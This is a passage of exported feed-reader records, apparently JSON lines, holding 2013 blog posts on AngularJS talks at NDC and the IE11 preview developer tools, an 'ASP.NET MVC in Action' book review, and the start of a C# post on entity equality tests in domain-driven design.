border=\"0\"></img></a></div>","author":"scott@OdeTocode.com","_id":{"$wrap":"$oid","v":1038}}
{"k":"0000000084","o":"0000002641","v":"001"}
{"_id":1039,"_uid":1039,"_dt":1373742504550,"_s":"d43e859cb395640e13d43668646268f9"}
{"subscription":{"$wrap":"$oid","v":29},"link":"http://odetocode.com/blogs/scott/archive/2013/06/28/angularjs-videos-from-ndc-2013.aspx","title":"AngularJS Videos From NDC 2013","published":{"$wrap":"$date","v":1372410720000,"h":"2013-06-28T09:12:00.000Z"},"starred":false,"read":false,"content":"<p><a href=\"http://www.ndcoslo.com/\" target=\"_blank\"><img style=\"background-image: none; float: right; padding-top: 0px; padding-left: 0px; margin: 0px 0px 5px 5px; display: inline; padding-right: 0px; border: 0px;\" title=\"ndcoslo\" src=\"http://odetocode.com/images2/Windows-Live-Writer/AngularJS-Talks-From-NDC-2013_73A1/ndcoslo_3.png\" alt=\"ndcoslo\" width=\"179\" height=\"56\" align=\"right\" border=\"0\" /></a>I can’t say enough good things about<a href=\"http://www.ndcoslo.com/\" target=\"_blank\">The Norwegian Developers Conference</a>.</p><p>This year there were a couple talks on AngularJS.</p><p>First there was<a href=\"https://twitter.com/tomdale\" target=\"_blank\">Tom Dale</a>,<a href=\"https://twitter.com/peterc\" target=\"_blank\">Peter Cooper</a>, and<a href=\"https://twitter.com/robconery\" target=\"_blank\">Rob Conery</a>in an<a href=\"http://vimeo.com/68215606\" target=\"_blank\">EmberJS versus AngularJS cage match</a>. We also<a href=\"http://herdingcode.com/herding-code-169-tom-dale-and-rob-conery-on-the-emberjs-angularjs-cage-match-at-ndc/\" target=\"_blank\">interviewed Tom and Rob on Herding Code</a>after the match was over and Tom gave us some great insights on the future direction of Ember.</p><p><iframe src=\"http://player.vimeo.com/video/68215606\" frameborder=\"0\" width=\"500\" height=\"281\"></iframe></p><p><a href=\"http://vimeo.com/68215606\">Tom Dale, Peter Cooper and Rob Conery; Cage Match - EmberJS vs. Angular</a>from<a href=\"http://vimeo.com/ndcoslo\">NDCOslo</a>on<a href=\"http://vimeo.com\">Vimeo</a>.</p><p> </p><p>I also did a<a href=\"http://vimeo.com/68215604\" target=\"_blank\">long and rambling live coding session with AngularJS</a>. Hopefully someone can make sense of it all.</p><p><iframe src=\"http://player.vimeo.com/video/68215604\" frameborder=\"0\" width=\"500\" height=\"281\"></iframe></p><p><a href=\"http://vimeo.com/68215604\">Scott Allen: The Abstractions of AngularJS</a>from<a href=\"http://vimeo.com/ndcoslo\">NDCOslo</a>on<a href=\"http://vimeo.com\">Vimeo</a>.</p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/OdeToCode?a=I4wIT08xAxY:y-dypYs4ETo:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/OdeToCode?d=yIl2AUoC8zA\" border=\"0\"></img></a></div>","author":"scott@OdeTocode.com","_id":{"$wrap":"$oid","v":1039}}
{"k":"0000000084","o":"0000003904","v":"001"}
{"_id":1040,"_uid":1040,"_dt":1373742504550,"_s":"5cd88a4af9b6254f08018ff8bd58768f"}
{"subscription":{"$wrap":"$oid","v":29},"link":"http://odetocode.com/blogs/scott/archive/2013/06/27/ie11-preview-and-the-new-developer-tools.aspx","title":"IE11 Preview and the New Developer Tools","published":{"$wrap":"$date","v":1372324320000,"h":"2013-06-27T09:12:00.000Z"},"starred":false,"read":false,"content":"<p>The<a href=\"http://windows.microsoft.com/en-us/windows-8/download-preview\" target=\"_blank\">Windows 8.1 preview</a>includes a preview of Internet Explorer 11, which includes a new version of the F12 Developer Tools for inspecting, profiling, and debugging web sites.</p><h3>The Good</h3><p>The developer tools are now metrofied with flat buttons and an emphasis on content over window chrome. Although there are still a considerable number of icons and commands to press, it does seem easier to read and work with the information presented. All the important features are still here, though a few things seem to be missing (the ruler tool and link report as two examples), and they still behave the same and present the same information.</p><p><img style=\"background-image: none; float: none; padding-top: 0px; padding-left: 0px; margin: 5px auto; display: block; padding-right: 0px; border: 0px;\" title=\"\" src=\"http://odetocode.com/images2/Windows-Live-Writer/IE11-Preview-and-the-New-Developer-Tools_13BD1/image_6.png\" alt=\"Dev Tools DOM Explorer\" width=\"778\" height=\"515\" border=\"0\" /></p><p><strong>Update</strong>- yes, the DOM explorer tracks changes in real time now. Huge improvement!</p><h3>The New</h3><p>The emphasis is on performance with new“UI Responsiveness”,“Profiler”, and“Memory” sections.</p><p>The Memory tab is looking very useful for today’s apps and the heap snapshots are easier to use compared to the tools in other browsers. Likewise the code profiler is easy to work with and similar to the profiling tools for managed code in VS Ultimate.   </p><p><img style=\"background-image: none; float: none; padding-top: 0px; padding-left: 0px; margin-left: auto; display: block; padding-right: 0px; margin-right: auto; border: 0px;\" title=\"image\" src=\"http://odetocode.com/images2/Windows-Live-Writer/IE11-Preview-and-the-New-Developer-Tools_13BD1/image_5.png\" alt=\"image\" width=\"778\" height=\"515\" border=\"0\" /></p><p>The“UI Responsiveness” tab is visually appealing and highly interactive but contains an enormous amount of information and will require some guidance and practice to use properly.</p><p><img style=\"background-image: none; float: none; padding-top: 0px; padding-left: 0px; margin-left: auto; display: block; padding-right: 0px; margin-right: auto; border: 0px;\" title=\"image\" src=\"http://odetocode.com/images2/Windows-Live-Writer/IE11-Preview-and-the-New-Developer-Tools_13BD1/image_9.png\" alt=\"UI Responsive\" width=\"781\" height=\"486\" border=\"0\" /></p><h3>The Missing</h3><p>To get a full picture of what is happening on any given page, the IE dev tools will need to give us the ability to inspect local storage, session storage, IndexDB, and Application Cache. I didn’t find any of these in the current release.</p><p>Most worrisome is how there doesn’t appear to be any extensibility story for the tools. Framework oriented plugins for Knockout and Angular are popular in other browsers because they allow developers to work at a level above the code to see what is happening on a page. The ability to use simple HTML and JavaScript to create these types of plugins is what makes the other tools so popular. The IE dev tools will need a better extensibility story to keep web developers happy.</p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/OdeToCode?a=NuG7MLsNvOE:byCZD3mNAgk:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/OdeToCode?d=yIl2AUoC8zA\" border=\"0\"></img></a></div>","author":"scott@OdeTocode.com","_id":{"$wrap":"$oid","v":1040}}
{"k":"0000000084","o":"0000011130","v":"001"}
{"_id":1041,"_uid":1041,"_dt":1373742602031,"_s":"1d15ae52d86867f031bdc91544736a6f"}
{"subscription":{"$wrap":"$oid","v":36},"link":"http://nathan.whiteboard-it.com/archive/2009/07/06/review-of-asp.net-mvc-in-action.aspx","title":"Review of ASP.NET MVC in Action","published":{"$wrap":"$date","v":1246900145000,"h":"2009-07-06T17:09:05.000Z"},"starred":false,"read":false,"content":"<p><span style=\"WIDOWS: 2; TEXT-TRANSFORM: none; TEXT-INDENT: 0px; BORDER-COLLAPSE: separate; FONT: 16px\"Times New Roman\"; WHITE-SPACE: normal; ORPHANS: 2; LETTER-SPACING: normal; COLOR: rgb(0,0,0); WORD-SPACING: 0px; -webkit-border-horizontal-spacing: 0px; -webkit-border-vertical-spacing: 0px; -webkit-text-decorations-in-effect: none; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px\" class=\"Apple-style-span\"><span style=\"FONT-FAMILY: Arial; WHITE-SPACE: pre-wrap; COLOR: rgb(64,64,64); FONT-SIZE: 12px\" class=\"Apple-style-span\">I recently read<a href=\"http://www.manning.com/palermo/\">ASP.NET MVC in Action</a>by Jeffrey Palermo, Ben Scheirman, and Jimmy Bogard. The publication is an excellent introduction to the the ASP.NET MVC framework. The authors provide excellent background on the problems facing the MS development community and the solutions that ASP.NET MVC has offered to these problems. These problems include the general ineptitude of the view engines with which traditional ASP development and even<a href=\"http://www.w3schools.com/aspnet/aspnet_forms.asp\">webforms</a>development were driven.</span></span></p><p><span style=\"WIDOWS: 2; TEXT-TRANSFORM: none; TEXT-INDENT: 0px; BORDER-COLLAPSE: separate; FONT: 16px\"Times New Roman\"; WHITE-SPACE: normal; ORPHANS: 2; LETTER-SPACING: normal; COLOR: rgb(0,0,0); WORD-SPACING: 0px; -webkit-border-horizontal-spacing: 0px; -webkit-border-vertical-spacing: 0px; -webkit-text-decorations-in-effect: none; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px\" class=\"Apple-style-span\"><span style=\"FONT-FAMILY: Arial; WHITE-SPACE: pre-wrap; COLOR: rgb(64,64,64); FONT-SIZE: 12px\" class=\"Apple-style-span\">ASP.NET MVC is the clear answer to seperation of concerns that webforms attempted to give us with the code-behind files. The introductory chapter will get the beginner up-and-running quickly. The diagrams illustrate the points that the concise text makes. Even those without any experience with an MVC framework will find the directions and explanations well-thought-out and easy to follow.</span></span></p><p><span style=\"WIDOWS: 2; TEXT-TRANSFORM: none; TEXT-INDENT: 0px; BORDER-COLLAPSE: separate; FONT: 16px\"Times New Roman\"; WHITE-SPACE: normal; ORPHANS: 2; LETTER-SPACING: normal; COLOR: rgb(0,0,0); WORD-SPACING: 0px; -webkit-border-horizontal-spacing: 0px; -webkit-border-vertical-spacing: 0px; -webkit-text-decorations-in-effect: none; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px\" class=\"Apple-style-span\"><span style=\"FONT-FAMILY: Arial; WHITE-SPACE: pre-wrap; COLOR: rgb(64,64,64); FONT-SIZE: 12px\" class=\"Apple-style-span\">Beyond the introductory content, I was genuinely impressed with the depth that the authors dove into the community and th</span></span><span style=\"WIDOWS: 2; TEXT-TRANSFORM: none; TEXT-INDENT: 0px; BORDER-COLLAPSE: separate; FONT: 16px\"Times New Roman\"; WHITE-SPACE: normal; ORPHANS: 2; LETTER-SPACING: normal; COLOR: rgb(0,0,0); WORD-SPACING: 0px; -webkit-border-horizontal-spacing: 0px; -webkit-border-vertical-spacing: 0px; -webkit-text-decorations-in-effect: none; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px\" class=\"Apple-style-span\"><span style=\"FONT-FAMILY: Arial; WHITE-SPACE: pre-wrap; COLOR: rgb(64,64,64); FONT-SIZE: 12px\" class=\"Apple-style-span\">e framework.<a href=\"http://haacked.com/\">Phil Haack's</a>route debugger, a piece of code intimately familiar to those of us who have been following the development of the framework since its early days, is mentioned and code based upon it is provided. The authors discuss such advanced techniques as<a href=\"http://nayyeri.net/blog/custom-controller-factory-in-asp-net-mvc/\">creating a custom controller factory</a>, a must for those of us who employ<a href=\"http://en.wikipedia.org/wiki/Dependency_injection\">dependency injection</a>.</span></span></p><p><span style=\"WIDOWS: 2; TEXT-TRANSFORM: none; TEXT-INDENT: 0px; BORDER-COLLAPSE: separate; FONT: 16px\"Times New Roman\"; WHITE-SPACE: normal; ORPHANS: 2; LETTER-SPACING: normal; COLOR: rgb(0,0,0); WORD-SPACING: 0px; -webkit-border-horizontal-spacing: 0px; -webkit-border-vertical-spacing: 0px; -webkit-text-decorations-in-effect: none; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px\" class=\"Apple-style-span\"><span style=\"FONT-FAMILY: Arial; WHITE-SPACE: pre-wrap; COLOR: rgb(64,64,64); FONT-SIZE: 12px\" class=\"Apple-style-span\">Each new concept is introduced with illustrative code examples. I was particularlly impressed with Chatper 9: Ajax in ASP.NET MVC. A note on unobrusive javascript reads:</span></span></p><blockquote style=\"MARGIN-RIGHT: 0px\" dir=\"ltr\"><p><span style=\"WIDOWS: 2; TEXT-TRANSFORM: none; TEXT-INDENT: 0px; BORDER-COLLAPSE: separate; FONT: 16px\"Times New Roman\"; WHITE-SPACE: normal; ORPHANS: 2; LETTER-SPACING: normal; COLOR: rgb(0,0,0); WORD-SPACING: 0px; -webkit-border-horizontal-spacing: 0px; -webkit-border-vertical-spacing: 0px; -webkit-text-decorations-in-effect: none; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px\" class=\"Apple-style-span\"><span style=\"FONT-FAMILY: Arial; WHITE-SPACE: pre-wrap; COLOR: rgb(64,64,64); FONT-SIZE: 12px\" class=\"Apple-style-span\"><em>You might notice throughout this chapter that I prefer unobtrusive Javascript. This means that the functionality of the page degrades gracefully in the absence of Javascript.</em></span></span></p></blockquote><p><span style=\"WIDOWS: 2; TEXT-TRANSFORM: none; TEXT-INDENT: 0px; BORDER-COLLAPSE: separate; FONT: 16px\"Times New Roman\"; WHITE-SPACE: normal; ORPHANS: 2; LETTER-SPACING: normal; COLOR: rgb(0,0,0); WORD-SPACING: 0px; -webkit-border-horizontal-spacing: 0px; -webkit-border-vertical-spacing: 0px; -webkit-text-decorations-in-effect: none; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px\" class=\"Apple-style-span\"><span style=\"FONT-FAMILY: Arial; WHITE-SPACE: pre-wrap; COLOR: rgb(64,64,64); FONT-SIZE: 12px\" class=\"Apple-style-span\">This shows careful attention by the authors to provide guidance on best practices. You will find this type of detail throughout the book. This is very refreshing because the Microsoft development community has lagged behind other communities in following wise guidelines and setting sensible best-practices.</span></span></p><p><span style=\"WIDOWS: 2; TEXT-TRANSFORM: none; TEXT-INDENT: 0px; BORDER-COLLAPSE: separate; FONT: 16px\"Times New Roman\"; WHITE-SPACE: normal; ORPHANS: 2; LETTER-SPACING: normal; COLOR: rgb(0,0,0); WORD-SPACING: 0px; -webkit-border-horizontal-spacing: 0px; -webkit-border-vertical-spacing: 0px; -webkit-text-decorations-in-effect: none; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px\" class=\"Apple-style-span\"><span style=\"FONT-FAMILY: Arial; WHITE-SPACE: pre-wrap; COLOR: rgb(64,64,64); FONT-SIZE: 12px\" class=\"Apple-style-span\">The new Microsfot embrace of open-source is also made obvious as the authors present<a href=\"http://jquery.com/\">jQuery</a>code in the AJAX chapter.</span></span></p><p><span style=\"WIDOWS: 2; TEXT-TRANSFORM: none; TEXT-INDENT: 0px; BORDER-COLLAPSE: separate; FONT: 16px\"Times New Roman\"; WHITE-SPACE: normal; ORPHANS: 2; LETTER-SPACING: normal; COLOR: rgb(0,0,0); WORD-SPACING: 0px; -webkit-border-horizontal-spacing: 0px; -webkit-border-vertical-spacing: 0px; -webkit-text-decorations-in-effect: none; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px\" class=\"Apple-style-span\"><span style=\"FONT-FAMILY: Arial; WHITE-SPACE: pre-wrap; COLOR: rgb(64,64,64); FONT-SIZE: 12px\" class=\"Apple-style-span\">Chapter 10, hosting and deplpoyment, is a testament to the thoroughness with which the framework is covered. Deploying on IIS6 and earlier, something that can be quite tricky, is covered well. The configuration option of using .aspx extensions as well as the option to use URL rewriting are covered. URL rewriting can be quite difficult, but the authors provide examples to bring it all together.</span></span></p><p><span style=\"WIDOWS: 2; TEXT-TRANSFORM: none; TEXT-INDENT: 0px; BORDER-COLLAPSE: separate; FONT: 16px\"Times New Roman\"; WHITE-SPACE: normal; ORPHANS: 2; LETTER-SPACING: normal; COLOR: rgb(0,0,0); WORD-SPACING: 0px; -webkit-border-horizontal-spacing: 0px; -webkit-border-vertical-spacing: 0px; -webkit-text-decorations-in-effect: none; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px\" class=\"Apple-style-span\"><span style=\"FONT-FAMILY: Arial; WHITE-SPACE: pre-wrap; COLOR: rgb(64,64,64); FONT-SIZE: 12px\" class=\"Apple-style-span\">The ASP.NET MVC framework is a breath of fresh-air for the Microsoft development world. It is a sensible, logical framework that allows extensability. ASP.NET MVC and<a href=\"http://msdn.microsoft.com/en-us/netframework/aa663324.aspx\">WCF</a>are the two best frameworks that Microsoft has ever produced in my opinion.</span></span></p><p><span style=\"WIDOWS: 2; TEXT-TRANSFORM: none; TEXT-INDENT: 0px; BORDER-COLLAPSE: separate; FONT: 16px\"Times New Roman\"; WHITE-SPACE: normal; ORPHANS: 2; LETTER-SPACING: normal; COLOR: rgb(0,0,0); WORD-SPACING: 0px; -webkit-border-horizontal-spacing: 0px; -webkit-border-vertical-spacing: 0px; -webkit-text-decorations-in-effect: none; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px\" class=\"Apple-style-span\"><span style=\"FONT-FAMILY: Arial; WHITE-SPACE: pre-wrap; COLOR: rgb(64,64,64); FONT-SIZE: 12px\" class=\"Apple-style-span\">ASP.NET MVC in Action will guide you from your first project through advanced topics such as AJAX and deploying on suboptimal (read IIS6) hosting environments. The writing style is clear and concise. Diagrams and code examples are abundant. I recommend it for anyone looking for a great resource for learning about or becoming a better user of the ASP.NET MVC framework.</span></span><br class=\"Apple-interchange-newline\" /></p><img src=\"http://nathan.whiteboard-it.com/aggbug/18.aspx\" width=\"1\" height=\"1\" /><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/PublicClassWheel?a=kGWXbKP2jjI:Bme73F40fLU:tcjm6QUOmhc\"><img src=\"http://feeds.feedburner.com/~ff/PublicClassWheel?d=tcjm6QUOmhc\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/PublicClassWheel?a=kGWXbKP2jjI:Bme73F40fLU:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/PublicClassWheel?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/PublicClassWheel?a=kGWXbKP2jjI:Bme73F40fLU:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/PublicClassWheel?d=7Q72WNTAKBA\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/PublicClassWheel/~4/kGWXbKP2jjI\" height=\"1\" width=\"1\"/>","author":"Nathan Stott","_id":{"$wrap":"$oid","v":1041}}
{"k":"0000000084","o":"0000039208","v":"001"}
{"_id":1042,"_uid":1042,"_dt":1373742602032,"_s":"ffbc1e9c4c1ddc8a7cbdd038fa932e11"}
{"subscription":{"$wrap":"$oid","v":36},"link":"http://nathan.whiteboard-it.com/archive/2009/03/06/asp.net-mvc-domain-driven-design-deux.aspx","title":"ASP.NET MVC Domain Driven Design Deux","published":{"$wrap":"$date","v":1236356517000,"h":"2009-03-06T16:21:57.000Z"},"starred":false,"read":false,"content":"<h4>Series Navigation</h4><ol><li><a href=\"http://nathan.whiteboard-it.com/archive/2009/03/01/asp.net-mvc-domain-driven-design.aspx\">Setup</a></li><li><a href=\"http://nathan.whiteboard-it.com/archive/2009/03/06/asp.net-mvc-domain-driven-design-deux.aspx\">Mapping and Entity Equality</a></li></ol><h3>Entity Equality</h3><p>We've got some more house keeping to do on our Entity object before proceding.  Because entities are comporable based upon Id, a standard use of the == operator will produce undesirable results.  When using an ORM, this is particularly important.  You will often have instances of objects, especially objects in child relationships, that are the same as, but not reference equal to, one another.</p><h3>Test Cases for Desired Entity Equality Behavior</h3><p>I'm a believer in documentation via test cases, so here are my test cases that demonstrate the desired behavior:</p><div style=\"FONT-WEIGHT: bold; FONT-SIZE: 10pt; BACKGROUND: black; COLOR: white; FONT-FAMILY: Courier New\"><p style=\"MARGIN: 0px\">[<span style=\"COLOR: #ffc66d\">TestFixture</span>]</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">public</span><span style=\"COLOR: #cc7832\">class</span><span style=\"COLOR: #ffc66d\">EntityEqualityContext</span></p><p style=\"MARGIN: 0px\">{</p><p style=\"MARGIN: 0px\">[<span style=\"COLOR: #ffc66d\">Test</span>]</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">public</span><span style=\"COLOR: #cc7832\">void</span>TwoTransientEntitiesShouldNotBeEqual()</p><p style=\"MARGIN: 0px\">{</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">var</span>entity1 =<span style=\"COLOR: #cc7832\">new</span><span style=\"COLOR: #ffc66d\">TestEntity</span>();</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">var</span>entity2 =<span style=\"COLOR: #cc7832\">new</span><span style=\"COLOR: #ffc66d\">TestEntity</span>();</p><p style=\"MARGIN: 0px\"></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #ffc66d\">Assert</span><span style=\"FONT-WEIGHT: normal\">.AreNotEqual(entity1, entity2,</span><span style=\"COLOR: #a5c25c\">\"Different transient entities should not be equal.\"</span>);</p><p style=\"MARGIN: 0px\">}</p><p style=\"MARGIN: 0px\"></p><p style=\"MARGIN: 0px\">[<span style=\"COLOR: #ffc66d\">Test</span>]</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">public</span><span style=\"COLOR: #cc7832\">void</span>TwoReferencesToSameTransientEntityShouldBeEqual()</p><p style=\"MARGIN: 0px\">{</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">var</span>entity1 =<span style=\"COLOR: #cc7832\">new</span><span style=\"COLOR: #ffc66d\">TestEntity</span>();</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">var</span>entity2 = entity1;</p><p style=\"MARGIN: 0px\"></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #ffc66d\">Assert</span><span style=\"FONT-WEIGHT: normal\">.AreEqual(entity1, entity2,</span><span style=\"COLOR: #a5c25c\">\"Two references to the same transient entity should be equal.\"</span>);</p><p style=\"MARGIN: 0px\">}</p><p style=\"MARGIN: 0px\"></p><p style=\"MARGIN: 0px\">[<span style=\"COLOR: #ffc66d\">Test</span>]</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">public</span><span style=\"COLOR: #cc7832\">void</span>EntitiesWithSameIdShouldBeEqual()</p><p style=\"MARGIN: 0px\">{</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">var</span>entity1 =<span style=\"COLOR: #cc7832\">new</span><span style=\"COLOR: #ffc66d\">TestEntity</span>();</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">var</span>entity2 =<span style=\"COLOR: #cc7832\">new</span><span style=\"COLOR: #ffc66d\">TestEntity</span>();</p><p style=\"MARGIN: 0px\"></p><p style=\"MARGIN: 0px\">entity1.SetId(<span style=\"COLOR: #6897bb\">1</span>);</p><p style=\"MARGIN: 0px\">entity2.SetId(<span style=\"COLOR: #6897bb\">1</span>);</p><p style=\"MARGIN: 0px\"></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #ffc66d\">Assert</span><span style=\"FONT-WEIGHT: normal\">.AreEqual(entity1, entity2,</span><span style=\"COLOR: #a5c25c\">\"Entities with same id should be equal.\"</span>);</p><p style=\"MARGIN: 0px\">}</p><p style=\"MARGIN: 0px\"></p><p style=\"MARGIN: 0px\">[<span style=\"COLOR: #ffc66d\">Test</span>]</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">public</span><span style=\"COLOR: #cc7832\">void</span>EntitiesWithDifferentIdShouldNotBeEqual()</p><p style=\"MARGIN: 0px\">{</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">var</span>entity1 =<span style=\"COLOR: #cc7832\">new</span><span style=\"COLOR: #ffc66d\">TestEntity</span>();</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">var</span>entity2 =<span style=\"COLOR: #cc7832\">new</span><span style=\"COLOR: #ffc66d\">TestEntity</span>();</p><p style=\"MARGIN: 0px\"></p><p style=\"MARGIN: 0px\">entity1.SetId(<span style=\"COLOR: #6897bb\">1</span>);</p><p style=\"MARGIN: 0px\">entity2.SetId(<span style=\"COLOR: #6897bb\">2</span>);</p><p style=\"MARGIN: 0px\"></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #ffc66d\">Assert</span><span style=\"FONT-WEIGHT: normal\">.AreNotEqual(entity1, entity2,</span><span style=\"COLOR: #a5c25c\">\"Entities with different ids should not be equal.\"</span>);</p><p style=\"MARGIN: 0px\">}</p><p style=\"MARGIN: 0px\"></p><p style=\"MARGIN: 0px\">[<span style=\"COLOR: #ffc66d\">Test</span>]</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">public</span><span style=\"COLOR: #cc7832\">void</span>EntityShouldNotEqualTransientEntity()</p><p style=\"MARGIN: 0px\">{</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">var</span>entity1 =<span style=\"COLOR: #cc7832\">new</span><span style=\"COLOR: #ffc66d\">TestEntity</span>();</p><p style=\"MARGIN: 0px\">entity1.SetId(<span style=\"COLOR: #6897bb\">1</span>);</p><p style=\"MARGIN: 0px\"></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">var</span>entity2 =<span style=\"COLOR: #cc7832\">new</span><span style=\"COLOR: #ffc66d\">TestEntity</span>();</p><p style=\"MARGIN: 0px\"></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #ffc66d\">Assert</span><span style=\"FONT-WEIGHT: normal\">.AreNotEqual(entity1, entity2,</span><span style=\"COLOR: #a5c25c\">\"Entity and transient entity should not be equal.\"</span>);</p><p style=\"MARGIN: 0px\">}</p><p style=\"MARGIN: 0px\"></p><p style=\"MARGIN: 0px\">[<span style=\"COLOR: #ffc66d\">Test</span>]</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">public</span><span style=\"COLOR: #cc7832\">void</span>EntitiesWithSameIdButDifferentTypesShouldNotBeEqual()</p><p style=\"MARGIN: 0px\">{</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">var</span>entity1 =<span style=\"COLOR: #cc7832\">new</span><span style=\"COLOR: #ffc66d\">TestEntity</span>();</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">var</span>entity2 =<span style=\"COLOR: #cc7832\">new</span><span style=\"COLOR: #ffc66d\">OtherEntity</span>();</p><p style=\"MARGIN: 0px\"></p><p style=\"MARGIN: 0px\">entity1.SetId(<span style=\"COLOR: #6897bb\">1</span>);</p><p style=\"MARGIN: 0px\">entity2.SetId(<span style=\"COLOR: #6897bb\">1</span>);</p><p style=\"MARGIN: 0px\"></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #ffc66d\">Assert</span><span style=\"FONT-WEIGHT: normal\">.AreNotEqual(entity1, entity2,</span><span style=\"COLOR: #a5c25c\">\"Entities of different types should not be equal even if they have the same id.\"</span>);</p><p style=\"MARGIN: 0px\">}</p><p style=\"MARGIN: 0px\"></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: gray\">///</span><span style=\"COLOR: green\"></span><span style=\"COLOR: gray\">&lt;summary&gt;</span></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: gray\">///</span><span style=\"COLOR: green\">A test entity class created so that we can excercise</span></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: gray\">///</span><span style=\"COLOR: green\">the functionality of the entity equaltiy members.</span></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: gray\">///</span><span style=\"COLOR: green\"></span><span style=\"COLOR: gray\">&lt;/summary&gt;</span></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">public</span><span style=\"COLOR: #cc7832\">class</span><span style=\"COLOR: #ffc66d\">TestEntity</span>:<span style=\"COLOR: #ffc66d\">Entity</span></p><p style=\"MARGIN: 0px\">{</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">private</span><span style=\"COLOR: #cc7832\">int</span>id;</p><p style=\"MARGIN: 0px\"></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">public</span><span style=\"COLOR: #cc7832\">override</span><span style=\"COLOR: #cc7832\">int</span>Id</p><p style=\"MARGIN: 0px\">{</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">get</span>{<span style=\"COLOR: #cc7832\">return</span>id; }</p><p style=\"MARGIN: 0px\">}</p><p style=\"MARGIN: 0px\"></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">public</span><span style=\"COLOR: #cc7832\">void</span>SetId(<span style=\"COLOR: #cc7832\">int</span>id)</p><p style=\"MARGIN: 0px\">{</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">this</span><span style=\"FONT-WEIGHT: normal\">.id = id;</span></p><p style=\"MARGIN: 0px\">}</p><p style=\"MARGIN: 0px\">}</p><p style=\"MARGIN: 0px\"></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">public</span><span style=\"COLOR: #cc7832\">class</span><span style=\"COLOR: #ffc66d\">OtherEntity</span>:<span style=\"COLOR: #ffc66d\">Entity</span></p><p style=\"MARGIN: 0px\">{</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">private</span><span style=\"COLOR: #cc7832\">int</span>id;</p><p style=\"MARGIN: 0px\"></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">public</span><span style=\"COLOR: #cc7832\">override</span><span style=\"COLOR: #cc7832\">int</span>Id</p><p style=\"MARGIN: 0px\">{</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">get</span>{<span style=\"COLOR: #cc7832\">return</span>id; }</p><p style=\"MARGIN: 0px\">}</p><p style=\"MARGIN: 0px\"></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">public</span><span style=\"COLOR: #cc7832\">void</span>SetId(<span style=\"COLOR: #cc7832\">int</span>id)</p><p style=\"MARGIN: 0px\">{</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">this</span><span style=\"FONT-WEIGHT: normal\">.id = id;</span></p><p style=\"MARGIN: 0px\">}</p><p style=\"MARGIN: 0px\">}</p><p style=\"MARGIN: 0px\">}</p></div><p></p><p>Summarized, these tests say that entities with id of 0 should only be equal if they are the same object.  This is reference equality.  Entities with an id should be equal if their ids are equal and they are of the same type.  This is<a target=\"_blank\" href=\"http://en.csharp-online.net/CSharp_Canonical_Forms—Identity_Equality\">identity equality</a>.</p><h3>Entity with Equaltiy Members</h3><div style=\"FONT-WEIGHT: bold; FONT-SIZE: 10pt; BACKGROUND: black; COLOR: white; FONT-FAMILY: Courier 